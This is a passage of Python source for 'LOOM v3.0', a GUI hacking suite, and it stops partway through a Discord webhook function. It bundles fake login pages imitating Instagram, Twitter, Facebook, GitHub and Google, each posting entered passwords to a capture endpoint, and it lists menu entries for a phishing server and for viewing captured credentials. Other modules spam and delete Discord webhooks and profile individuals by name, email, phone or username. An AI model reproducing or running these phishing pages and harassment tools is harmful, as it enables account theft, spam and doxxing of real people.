#!/usr/bin/env python3
"""
LOOM v3.0 - Terminal-Style GUI
OSINT, Pentesting, Discord, Phishing, Payloads
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, simpledialog, font
import json
import re
import time
import random
import socket
import threading
import webbrowser
from datetime import datetime
from pathlib import Path
import requests
import dns.resolver
import phonenumbers
from phonenumbers import carrier, geocoder
from email_validator import validate_email, EmailNotValidError
from bs4 import BeautifulSoup
import whois
import hashlib
import qrcode
import sys
import os
import ipaddress
from urllib.parse import urlparse, urljoin, quote_plus
import subprocess
import tempfile
import base64

# ─── CONFIG ──────────────────────────────────────────────────────────
PASSWORD = "67"

CONFIG = {
    "version": "3.0",
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15",
    ],
    "phishing_templates": ["instagram", "twitter", "facebook", "github", "google", "microsoft", "paypal", "steam", "discord", "tiktok"]
}

# ─── PHISHING TEMPLATES ──────────────────────────────────────────────
PHISHING_TEMPLATES = {
    "instagram": """<!DOCTYPE html><html><head><title>Instagram</title>
<style>body{font-family:Arial;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:40px;border-radius:8px;box-shadow:0 0 20px rgba(0,0,0,0.1);width:350px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #dbdbdb;border-radius:4px}
button{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-weight:bold;cursor:pointer}
</style></head><body><div class="container"><h2>Instagram</h2>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form></div></body></html>""",
    "twitter": """<!DOCTYPE html><html><head><title>Twitter</title>
<style>body{font-family:Helvetica;background:#15202b;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#1a2a3a;padding:40px;border-radius:16px;width:350px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:4px;background:#1a2a3a;color:#fff}
button{width:100%;padding:12px;background:#1d9bf0;color:#fff;border:none;border-radius:20px;font-weight:bold;cursor:pointer}
</style></head><body><div class="container"><h2 style="color:#1d9bf0">Twitter</h2>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form></div></body></html>""",
    "facebook": """<!DOCTYPE html><html><head><title>Facebook</title>
<style>body{font-family:Helvetica;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:30px;border-radius:8px;width:396px}
input{width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px}
button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-weight:bold;font-size:20px;cursor:pointer}
</style></head><body><div class="container"><h2 style="color:#1877f2">Facebook</h2>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form></div></body></html>""",
    "github": """<!DOCTYPE html><html><head><title>GitHub</title>
<style>body{font-family:Helvetica;background:#f6f8fa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:40px;border-radius:6px;width:340px}
input{width:100%;padding:10px;margin:8px 0;border:1px solid #d0d7de;border-radius:6px}
button{width:100%;padding:10px;background:#2da44e;color:#fff;border:none;border-radius:6px;font-weight:bold;cursor:pointer}
</style></head><body><div class="container"><h2>GitHub</h2>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>""",
    "google": """<!DOCTYPE html><html><head><title>Google</title>
<style>body{font-family:Roboto;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:48px 40px;border-radius:8px;border:1px solid #dadce0;width:350px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-weight:bold;cursor:pointer}
</style></head><body><div class="container"><h2>Google</h2>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>"""
}

# ─── MODULES ──────────────────────────────────────────────────────────
MODULES = {
    "OSINT": {
        "name_resolver": "Name -> social + public records",
        "username_sweeper": "Username -> 50+ platforms",
        "email_enricher": "Email -> breaches + accounts",
        "phone_parser": "Phone -> carrier + location",
        "ip_geolocator": "IP -> geo + ISP + ASN",
        "wallet_tracker": "Crypto -> transaction history",
        "subdomain_discovery": "Find subdomains",
        "directory_discovery": "Find directories",
        "dorking_engine": "Google/Bing/DDG dorking",
        "domain_whois": "WHOIS lookup",
    },
    "Pentesting": {
        "port_scanner": "Scan ports on target",
        "vulnerability_scanner": "Scan for vulnerabilities",
        "advanced_scanner": "Full security audit",
        "host_discovery": "Discover hosts on network",
        "ip_pinger": "Continuous ping monitoring",
    },
    "Discord": {
        "discord_user_lookup": "Lookup Discord user",
        "discord_invite_resolver": "Resolve invite info",
        "webhook_spam": "Spam webhook",
        "webhook_embed": "Send embed",
        "webhook_destroyer": "Delete webhook",
        "webhook_ghost_ping": "Ghost ping users",
    },
    "Phishing": {
        "phishing_server": "Start phishing server",
        "deploy_template": "Deploy phishing template",
        "view_creds": "View captured credentials",
    },
    "Social": {
        "roblox_profile": "Roblox profile",
        "instagram_lookup": "Instagram profile",
        "twitter_lookup": "Twitter profile",
        "tiktok_lookup": "TikTok profile",
        "youtube_channel": "YouTube channel",
        "telegram_profile": "Telegram profile",
    },
    "Utilities": {
        "hash_tools": "Generate hashes",
        "qr_generator": "Generate QR codes",
        "temp_mail": "Temporary email",
        "password_generator": "Strong passwords",
        "file_metadata": "Extract metadata",
        "website_cloner": "Clone website",
        "json_formatter": "Format JSON",
        "base64_tools": "Base64 encode/decode",
    },
}

# ─── TERMINAL GUI APPLICATION ──────────────────────────────────────
class LOOMTerminal:
    def __init__(self, root):
        self.root = root
        self.root.title("LOOM v3.0 - Complete Security Suite")
        self.root.geometry("1000x700")
        self.root.minsize(800, 500)
        self.root.configure(bg='#0a0a0a')
        
        # State
        self.phishing_process = None
        self.phishing_dir = None
        self.current_category = "OSINT"
        self.selected_module = None
        
        # ─── LOADING SCREEN ──────────────────────────────────────────
        self.show_loading_screen()
        
        # ─── PASSWORD PROMPT ─────────────────────────────────────────
        self.root.after(2000, self.show_password_prompt)
    
    def show_loading_screen(self):
        """Show loading screen with ASCII art"""
        self.loading_frame = tk.Frame(self.root, bg='#0a0a0a')
        self.loading_frame.pack(fill=tk.BOTH, expand=True)
        
        # ASCII art
        ascii_art = """
           __________.__             .__                         
  \\__    ___/|  |__   ____   |  |   ____   ____   _____  
    |    |   |  |  \\_/ __ \\  |  |  /  _ \\ /  _ \\ /     \\ 
    |    |   |   Y  \\  ___/  |  |_(  <_> |  <_> )  Y Y  \\
    |____|   |___|  /\\___  > |____/\\____/ \\____/|__|_|  /
                \\/     \\/                           \\/  
        """
        
        label = tk.Label(self.loading_frame, text=ascii_art, 
                         fg='#d4a373', bg='#0a0a0a',
                         font=('Consolas', 12), justify='left')
        label.pack(pady=(50, 10))
        
        tk.Label(self.loading_frame, text="Complete Security Suite v3.0",
                fg='#faedcd', bg='#0a0a0a',
                font=('Consolas', 14, 'bold')).pack()
        
        # Progress bar - FIXED: use ttk.Progressbar directly
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(self.loading_frame, 
                                             variable=self.progress_var,
                                             maximum=100, length=400)
        self.progress_bar.pack(pady=20)
        
        self.loading_text = tk.Label(self.loading_frame, text="Initializing...",
                                      fg='#d4a373', bg='#0a0a0a',
                                      font=('Consolas', 10))
        self.loading_text.pack()
        
        # Simulate loading
        self._simulate_loading()
    
    def _simulate_loading(self):
        steps = [
            ("Loading core modules", 20),
            ("Initializing OSINT engines", 15),
            ("Loading pentesting tools", 15),
            ("Preparing Discord modules", 10),
            ("Loading phishing templates", 15),
            ("Initializing social scrapers", 10),
            ("Loading utility modules", 10),
            ("Finalizing configuration", 5),
        ]
        
        def do_step(index=0):
            if index < len(steps):
                desc, amount = steps[index]
                self.loading_text.config(text=f"{desc}...")
                self.progress_var.set(self.progress_var.get() + amount)
                self.root.after(random.randint(300, 600), lambda: do_step(index + 1))
            else:
                self.loading_text.config(text="Ready!")
                self.root.after(500, self._show_main)
        
        do_step()
    
    def _show_main(self):
        """Transition to main interface"""
        self.loading_frame.destroy()
        self.create_widgets()
    
    def show_password_prompt(self):
        """Show password dialog"""
        password = simpledialog.askstring("LOOM Authentication", 
                                           "Enter password to unlock LOOM:",
                                           show='*', parent=self.root)
        if password == PASSWORD:
            return
        else:
            messagebox.showerror("Access Denied", "Invalid password. Exiting...")
            self.root.destroy()
    
    def create_widgets(self):
        """Create the main terminal-style interface"""
        # ─── MAIN CONTAINER ──────────────────────────────────────────
        main_frame = tk.Frame(self.root, bg='#0a0a0a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # ─── HEADER ──────────────────────────────────────────────────
        header_frame = tk.Frame(main_frame, bg='#0a0a0a')
        header_frame.pack(fill=tk.X)
        
        header_text = "═" * 60
        tk.Label(header_frame, text=header_text, fg='#d4a373', bg='#0a0a0a',
                font=('Consolas', 10)).pack()
        
        tk.Label(header_frame, text=" LOOM v3.0 - Complete Security Suite ",
                fg='#d4a373', bg='#0a0a0a',
                font=('Consolas', 12, 'bold')).pack()
        
        tk.Label(header_frame, text=header_text, fg='#d4a373', bg='#0a0a0a',
                font=('Consolas', 10)).pack()
        
        # ─── BODY ────────────────────────────────────────────────────
        body_frame = tk.Frame(main_frame, bg='#0a0a0a')
        body_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Left: Categories
        cat_frame = tk.Frame(body_frame, bg='#0a0a0a', width=200)
        cat_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))
        cat_frame.pack_propagate(False)
        
        tk.Label(cat_frame, text=" CATEGORIES ", fg='#d4a373', bg='#0a0a0a',
                font=('Consolas', 10, 'bold')).pack(pady=(0, 10))
        
        self.category_buttons = {}
        for cat in MODULES.keys():
            btn = tk.Button(cat_frame, text=cat, fg='#d4a373', bg='#0a0a0a',
                           font=('Consolas', 10),
                           relief='flat', anchor='w', padx=10,
                           activeforeground='#fefae0', activebackground='#1a1a1a',
                           command=lambda c=cat: self.switch_category(c))
            btn.pack(fill=tk.X, pady=2)
            self.category_buttons[cat] = btn
        
        # Separator
        tk.Frame(cat_frame, height=2, bg='#d4a373').pack(fill=tk.X, pady=10)
        
        tk.Label(cat_frame, text=" COMMANDS ", fg='#d4a373', bg='#0a0a0a',
                font=('Consolas', 10, 'bold')).pack(pady=(0, 5))
        
        commands = [
            ("[↑↓] Navigate", ""),
            ("[Enter] Select", ""),
            ("[R] Run Module", ""),
            ("[Q] Quit", ""),
        ]
        for cmd, _ in commands:
            tk.Label(cat_frame, text=cmd, fg='#faedcd', bg='#0a0a0a',
                    font=('Consolas', 9)).pack(anchor='w', pady=1)
        
        # Right: Content
        content_frame = tk.Frame(body_frame, bg='#0a0a0a')
        content_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Module display
        self.module_label = tk.Label(content_frame, text="", fg='#d4a373', bg='#0a0a0a',
                                      font=('Consolas', 11, 'bold'), anchor='w')
        self.module_label.pack(fill=tk.X, pady=(0, 5))
        
        self.module_listbox = tk.Listbox(content_frame, bg='#0a0a0a', fg='#e9edc9',
                                          selectbackground='#1a1a1a',
                                          selectforeground='#fefae0',
                                          font=('Consolas', 10),
                                          relief='flat', height=8)
        self.module_listbox.pack(fill=tk.X, pady=(0, 10))
        self.module_listbox.bind('<Double-Button-1>', lambda e: self.run_selected())
        self.module_listbox.bind('<Return>', lambda e: self.run_selected())
        self.module_listbox.bind('<Up>', lambda e: self.on_key('up'))
        self.module_listbox.bind('<Down>', lambda e: self.on_key('down'))
        
        # Target input
        input_frame = tk.Frame(content_frame, bg='#0a0a0a')
        input_frame.pack(fill=tk.X, pady=(0, 5))
        
        tk.Label(input_frame, text="> ", fg='#d4a373', bg='#0a0a0a',
                font=('Consolas', 10)).pack(side=tk.LEFT)
        
        self.target_entry = tk.Entry(input_frame, bg='#0a0a0a', fg='#d4a373',
                                      font=('Consolas', 10),
                                      relief='flat', insertbackground='#d4a373')
        self.target_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.target_entry.bind('<Return>', lambda e: self.run_selected())
        
        # Output area
        output_frame = tk.Frame(content_frame, bg='#0a0a0a')
        output_frame.pack(fill=tk.BOTH, expand=True)
        
        tk.Label(output_frame, text=" OUTPUT ", fg='#d4a373', bg='#0a0a0a',
                font=('Consolas', 10, 'bold')).pack(anchor='w')
        
        self.output_text = scrolledtext.ScrolledText(output_frame, 
                                                      wrap=tk.WORD,
                                                      bg='#0a0a0a', fg='#d4a373',
                                                      font=('Consolas', 10),
                                                      relief='flat',
                                                      insertbackground='#d4a373')
        self.output_text.pack(fill=tk.BOTH, expand=True, pady=2)
        
        # ─── STATUS BAR ──────────────────────────────────────────────
        status_frame = tk.Frame(main_frame, bg='#0a0a0a')
        status_frame.pack(fill=tk.X, pady=(5, 0))
        
        tk.Frame(status_frame, height=1, bg='#d4a373').pack(fill=tk.X, pady=2)
        
        self.status_label = tk.Label(status_frame, text="Ready", 
                                      fg='#d4a373', bg='#0a0a0a',
                                      font=('Consolas', 9))
        self.status_label.pack(side=tk.LEFT)
        
        self.module_status = tk.Label(status_frame, text="Module: None",
                                       fg='#d4a373', bg='#0a0a0a',
                                       font=('Consolas', 9))
        self.module_status.pack(side=tk.RIGHT)
        
        # ─── KEYBOARD BINDINGS ──────────────────────────────────────
        self.root.bind('<Up>', lambda e: self.on_key('up'))
        self.root.bind('<Down>', lambda e: self.on_key('down'))
        self.root.bind('<r>', lambda e: self.run_selected())
        self.root.bind('<R>', lambda e: self.run_selected())
        self.root.bind('<q>', lambda e: self.quit())
        self.root.bind('<Q>', lambda e: self.quit())
        
        # Initial load
        self.switch_category("OSINT")
        self.log("LOOM v3.0 initialized. Select a category and module.")
    
    def switch_category(self, category):
        """Switch to a different category"""
        self.current_category = category
        
        # Update button colors
        for cat, btn in self.category_buttons.items():
            if cat == category:
                btn.config(fg='#fefae0', bg='#1a1a1a')
            else:
                btn.config(fg='#d4a373', bg='#0a0a0a')
        
        # Update module list
        self.module_listbox.delete(0, tk.END)
        modules = MODULES.get(category, {})
        for name, desc in modules.items():
            self.module_listbox.insert(tk.END, f"  {name} - {desc}")
        
        self.module_listbox.selection_set(0)
        self.status_label.config(text=f"Category: {category}")
        self.log(f"Switched to {category}")
    
    def on_key(self, direction):
        """Handle arrow key navigation"""
        if direction == 'up':
            idx = self.module_listbox.curselection()
            if idx:
                new_idx = max(0, idx[0] - 1)
                self.module_listbox.selection_clear(0, tk.END)
                self.module_listbox.selection_set(new_idx)
                self.module_listbox.see(new_idx)
        elif direction == 'down':
            idx = self.module_listbox.curselection()
            if idx:
                new_idx = min(self.module_listbox.size() - 1, idx[0] + 1)
                self.module_listbox.selection_clear(0, tk.END)
                self.module_listbox.selection_set(new_idx)
                self.module_listbox.see(new_idx)
    
    def run_selected(self):
        """Run the selected module"""
        idx = self.module_listbox.curselection()
        if not idx:
            return
        
        line = self.module_listbox.get(idx[0])
        parts = line.split(" - ")
        if not parts:
            return
        module_name = parts[0].strip()
        
        target = self.target_entry.get().strip()
        if not target:
            self.log("Warning: No target entered. Please enter a target.")
            return
        
        self.selected_module = module_name
        self.module_status.config(text=f"Module: {module_name}")
        self.log(f"Running {module_name} on: {target}")
        
        threading.Thread(target=self.execute_module, args=(module_name, target), daemon=True).start()
    
    def execute_module(self, module_name, target):
        """Execute the selected module"""
        module_map = {
            "name_resolver": self.name_resolver,
            "username_sweeper": self.username_sweeper,
            "email_enricher": self.email_enricher,
            "phone_parser": self.phone_parser,
            "ip_geolocator": self.ip_geolocator,
            "wallet_tracker": self.wallet_tracker,
            "subdomain_discovery": self.subdomain_discovery,
            "directory_discovery": self.directory_discovery,
            "dorking_engine": self.dorking_engine,
            "domain_whois": self.domain_whois,
            "port_scanner": self.port_scanner,
            "vulnerability_scanner": self.vulnerability_scanner,
            "advanced_scanner": self.advanced_scanner,
            "host_discovery": self.host_discovery,
            "ip_pinger": self.ip_pinger,
            "discord_user_lookup": self.discord_user_lookup,
            "discord_invite_resolver": self.discord_invite_resolver,
            "webhook_spam": self.webhook_spam,
            "webhook_embed": self.webhook_embed,
            "webhook_destroyer": self.webhook_destroyer,
            "webhook_ghost_ping": self.webhook_ghost_ping,
            "roblox_profile": self.roblox_profile,
            "instagram_lookup": self.instagram_lookup,
            "twitter_lookup": self.twitter_lookup,
            "tiktok_lookup": self.tiktok_lookup,
            "youtube_channel": self.youtube_channel,
            "telegram_profile": self.telegram_profile,
            "hash_tools": self.hash_tools,
            "qr_generator": self.qr_generator,
            "temp_mail": self.temp_mail,
            "password_generator": self.password_generator,
            "file_metadata": self.file_metadata,
            "website_cloner": self.website_cloner,
            "json_formatter": self.json_formatter,
            "base64_tools": self.base64_tools,
            "phishing_server": self.phishing_server,
            "deploy_template": self.deploy_template,
            "view_creds": self.view_creds,
        }
        
        if module_name in module_map:
            result = module_map[module_name](target)
        else:
            result = f"Module '{module_name}' not implemented."
        
        self.root.after(0, lambda: self.log(result))
        self.root.after(0, lambda: self.status_label.config(text="Ready"))
    
    def log(self, message):
        """Add message to output"""
        self.output_text.insert(tk.END, f"{message}\n")
        self.output_text.see(tk.END)
    
    # ─── OSINT MODULES ──────────────────────────────────────────────
    
    def name_resolver(self, name):
        lines = [f"[Name Resolver] Target: {name}"]
        parts = name.strip().split()
        first = parts[0] if parts else ""
        last = parts[-1] if len(parts) > 1 else ""
        
        perms = []
        if first and last:
            perms.extend([f"{first}.{last}", f"{last}.{first}", f"{first}{last}", f"{last}{first}"])
        
        lines.append("Permutations:")
        for p in perms[:10]:
            lines.append(f"  - {p}")
        
        emails = []
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        for domain in domains:
            if first and last:
                emails.extend([f"{first}.{last}@{domain}", f"{first}{last}@{domain}"])
        
        lines.append("Email Permutations:")
        for e in emails[:10]:
            lines.append(f"  - {e}")
        
        lines.append("Breach Check:")
        for email in emails[:3]:
            try:
                resp = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}")
                if resp.status_code == 200:
                    lines.append(f"  + {email} -> {len(resp.json())} breaches")
                elif resp.status_code == 404:
                    lines.append(f"  - {email} -> No breaches")
                else:
                    lines.append(f"  - {email} -> Rate limited")
            except:
                lines.append(f"  - {email} -> Error")
            time.sleep(1)
        return "\n".join(lines)
    
    def username_sweeper(self, username):
        lines = [f"[Username Sweeper] Target: {username}"]
        platforms = [
            ("Instagram", f"https://www.instagram.com/{username}"),
            ("Twitter", f"https://twitter.com/{username}"),
            ("GitHub", f"https://github.com/{username}"),
            ("Reddit", f"https://www.reddit.com/user/{username}"),
            ("YouTube", f"https://www.youtube.com/@{username}"),
            ("TikTok", f"https://www.tiktok.com/@{username}"),
            ("LinkedIn", f"https://www.linkedin.com/in/{username}"),
            ("Telegram", f"https://t.me/{username}"),
            ("Roblox", f"https://www.roblox.com/user.aspx?username={username}"),
        ]
        
        found = 0
        for name, url in platforms:
            try:
                resp = requests.get(url, timeout=5, headers={"User-Agent": random.choice(CONFIG["user_agents"])})
                if resp.status_code == 200:
                    soup = BeautifulSoup(resp.text, "html.parser")
                    title = soup.title.string.lower() if soup.title else ""
                    if "not found" not in title and "doesn't exist" not in title:
                        lines.append(f"  + {name}: {url}")
                        found += 1
                    else:
                        lines.append(f"  - {name}: Not found")
                else:
                    lines.append(f"  - {name}: HTTP {resp.status_code}")
            except:
                lines.append(f"  - {name}: Error")
            time.sleep(0.3)
        lines.append(f"Found on {found}/{len(platforms)} platforms")
        return "\n".join(lines)
    
    def email_enricher(self, email):
        lines = [f"[Email Enricher] Target: {email}"]
        try:
            valid = validate_email(email)
            lines.append(f"  + Valid: {valid.normalized}")
        except:
            lines.append("  - Invalid email")
            return "\n".join(lines)
        
        domain = email.split("@")[-1]
        try:
            mx = dns.resolver.resolve(domain, "MX")
            lines.append(f"  MX: {[str(r.exchange) for r in mx]}")
        except:
            lines.append("  MX: None")
        
        try:
            resp = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}")
            if resp.status_code == 200:
                data = resp.json()
                lines.append(f"  Breaches: {len(data)}")
                for b in data[:3]:
                    lines.append(f"    - {b.get('Name')} ({b.get('BreachDate')})")
            elif resp.status_code == 404:
                lines.append("  Breaches: None")
            else:
                lines.append("  Breaches: Rate limited")
        except:
            lines.append("  Breaches: Error")
        return "\n".join(lines)
    
    def phone_parser(self, phone):
        lines = [f"[Phone Parser] Target: {phone}"]
        try:
            parsed = phonenumbers.parse(phone, "US")
            if phonenumbers.is_valid_number(parsed):
                lines.append(f"  + Valid")
                lines.append(f"  E.164: {phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)}")
                lines.append(f"  Carrier: {carrier.name_for_number(parsed, 'en') or 'Unknown'}")
                lines.append(f"  Location: {geocoder.description_for_number(parsed, 'en') or 'Unknown'}")
            else:
                lines.append("  - Invalid")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def ip_geolocator(self, ip):
        lines = [f"[IP Geolocator] Target: {ip}"]
        try:
            resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "success":
                    lines.append(f"  Country: {data.get('country')}")
                    lines.append(f"  City: {data.get('city')}")
                    lines.append(f"  ISP: {data.get('isp')}")
                    lines.append(f"  Org: {data.get('org')}")
                    lines.append(f"  Proxy: {data.get('proxy')}")
                else:
                    lines.append("  - API error")
            else:
                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def wallet_tracker(self, address):
        lines = [f"[Wallet Tracker] Target: {address}"]
        if address.startswith("1") or address.startswith("3") or address.startswith("bc1"):
            lines.append("  Chain: Bitcoin")
            try:
                resp = requests.get(f"https://blockchain.info/rawaddr/{address}", timeout=15)
                if resp.status_code == 200:
                    data = resp.json()
                    lines.append(f"  Balance: {data.get('final_balance', 0) / 1e8:.8f} BTC")
                    lines.append(f"  TX: {data.get('n_tx', 0)}")
                else:
                    lines.append("  - API error")
            except Exception as e:
                lines.append(f"  - Error: {str(e)}")
        elif address.startswith("0x") and len(address) == 42:
            lines.append("  Chain: Ethereum")
            try:
                resp = requests.get(f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest", timeout=15)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("status") == "1":
                        lines.append(f"  Balance: {int(data.get('result', 0)) / 1e18:.6f} ETH")
                    else:
                        lines.append("  - API error")
                else:
                    lines.append(f"  - HTTP {resp.status_code}")
            except Exception as e:
                lines.append(f"  - Error: {str(e)}")
        else:
            lines.append("  - Unsupported chain")
        return "\n".join(lines)
    
    def subdomain_discovery(self, domain):
        lines = [f"[Subdomain Discovery] Target: {domain}"]
        subs = ["www", "mail", "ftp", "blog", "dev", "api", "cdn", "docs", "admin", "test", "vpn", "smtp", "pop", "mx", "static"]
        found = []
        for sub in subs:
            full = f"{sub}.{domain}"
            try:
                dns.resolver.resolve(full, "A")
                found.append(full)
                lines.append(f"  + {full}")
            except:
                pass
        lines.append(f"Found {len(found)} subdomains")
        return "\n".join(lines)
    
    def directory_discovery(self, target):
        lines = [f"[Directory Discovery] Target: {target}"]
        dirs = ["admin", "login", "wp-admin", "assets", "images", "js", "css", "uploads", "files", "api", "docs", "blog"]
        found = []
        for d in dirs:
            url = f"{target}/{d}"
            try:
                resp = requests.get(url, timeout=3)
                if resp.status_code == 200:
                    found.append(url)
                    lines.append(f"  + {d}")
            except:
                pass
        lines.append(f"Found {len(found)} directories")
        return "\n".join(lines)
    
    def dorking_engine(self, query):
        lines = [f"[Dorking Engine] Target: {query}"]
        try:
            session = requests.Session()
            session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
            url = f"https://www.google.com/search?q={query.replace(' ', '+')}&num=5"
            resp = session.get(url, timeout=10)
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, "html.parser")
                for g in soup.find_all("div", class_="g")[:5]:
                    link = g.find("a")
                    if link and link.get("href"):
                        href = link.get("href")
                        if href.startswith("/url?q="):
                            href = href.split("/url?q=")[1].split("&")[0]
                        title = g.find("h3")
                        lines.append(f"  - {title.text if title else 'No title'}\n    {href}")
            else:
                lines.append(f"  - Google: HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def domain_whois(self, domain):
        lines = [f"[WHOIS] Target: {domain}"]
        try:
            w = whois.whois(domain)
            lines.append(f"  Registrar: {w.registrar}")
            lines.append(f"  Created: {w.creation_date}")
            lines.append(f"  Expires: {w.expiration_date}")
            lines.append(f"  NS: {w.name_servers}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    # ─── PENTESTING ──────────────────────────────────────────────────
    
    def port_scanner(self, target):
        lines = [f"[Port Scanner] Target: {target}"]
        ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                if sock.connect_ex((target, port)) == 0:
                    open_ports.append(port)
                    lines.append(f"  + Port {port} - OPEN")
                sock.close()
            except:
                pass
        if not open_ports:
            lines.append("  - No open ports found")
        return "\n".join(lines)
    
    def vulnerability_scanner(self, target):
        lines = [f"[Vulnerability Scanner] Target: {target}"]
        vulns = []
        try:
            resp = requests.get(f"http://{target}", timeout=10)
            if resp.status_code == 200:
                if "Index of /" in resp.text:
                    vulns.append("  ! Directory listing enabled")
                headers = resp.headers
                for h in ["X-Frame-Options", "X-Content-Type-Options", "Strict-Transport-Security"]:
                    if h not in headers:
                        vulns.append(f"  ! Missing {h}")
        except:
            pass
        
        if vulns:
            lines.extend(vulns)
        else:
            lines.append("  + No obvious vulnerabilities")
        return "\n".join(lines)
    
    def advanced_scanner(self, target):
        lines = ["[Advanced Scanner]"]
        lines.append("-"*40)
        lines.append(self.ip_geolocator(target))
        lines.append("-"*40)
        lines.append(self.port_scanner(target))
        lines.append("-"*40)
        lines.append(self.vulnerability_scanner(target))
        return "\n".join(lines)
    
    def host_discovery(self, cidr):
        lines = [f"[Host Discovery] Target: {cidr}"]
        try:
            network = ipaddress.ip_network(cidr, strict=False)
            for ip in list(network.hosts())[:10]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    if sock.connect_ex((str(ip), 80)) == 0:
                        lines.append(f"  + {ip} - Online")
                    sock.close()
                except:
                    pass
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def ip_pinger(self, target):
        lines = [f"[IP Pinger] Target: {target}"]
        for i in range(5):
            try:
                start = time.time()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, 80))
                sock.close()
                if result == 0:
                    lines.append(f"  + Attempt {i+1}: {(time.time()-start)*1000:.2f}ms")
                else:
                    lines.append(f"  - Attempt {i+1}: Failed")
            except:
                lines.append(f"  - Attempt {i+1}: Error")
            time.sleep(1)
        return "\n".join(lines)
    
    # ─── DISCORD ──────────────────────────────────────────────────────
    
    def discord_user_lookup(self, user_id):
        lines = [f"[Discord User] Target: {user_id}"]
        try:
            resp = requests.get(f"https://discord.com/api/v9/users/{user_id}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                lines.append(f"  Username: {data.get('username')}")
                lines.append(f"  Discriminator: {data.get('discriminator')}")
                lines.append(f"  Bot: {data.get('bot', False)}")
            else:
                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def discord_invite_resolver(self, code):
        lines = [f"[Invite Resolver] Target: {code}"]
        try:
            resp = requests.get(f"https://discord.com/api/v9/invites/{code}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                guild = data.get("guild", {})
                lines.append(f"  Guild: {guild.get('name')}")
                lines.append(f"  Members: {data.get('approximate_member_count')}")
            else:
                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def webhook_spam(self, url):
        lines = [f"[Webhook Spam] Target: {url[:40]}..."]
        for i in range(5):
            try:
                resp = requests.post(url, json={"content": f"LOOM Test {i+1}"}, timeout=5)
                if resp.status_code == 204:
                    lines.append(f"  + Message {i+1} sent")
                else:
                    lines.append(f"  - Message {i+1} failed")
            except:
                lines.append(f"  - Message {i+1} error")
            time.sleep(0.5)
        return "\n".join(lines)
    
    def webhook_embed(self, url):
        lines = [f"[Webhook Embed] Target: {url[:40]}..."]
        try:
            embed = {"title": "LOOM Test", "description": "Embed test", "color": 0x00ff00}
            resp = requests.post(url, json={"embeds": [embed]}, timeout=5)
            if resp.status_code == 204:
                lines.append("  + Embed sent")
            else:
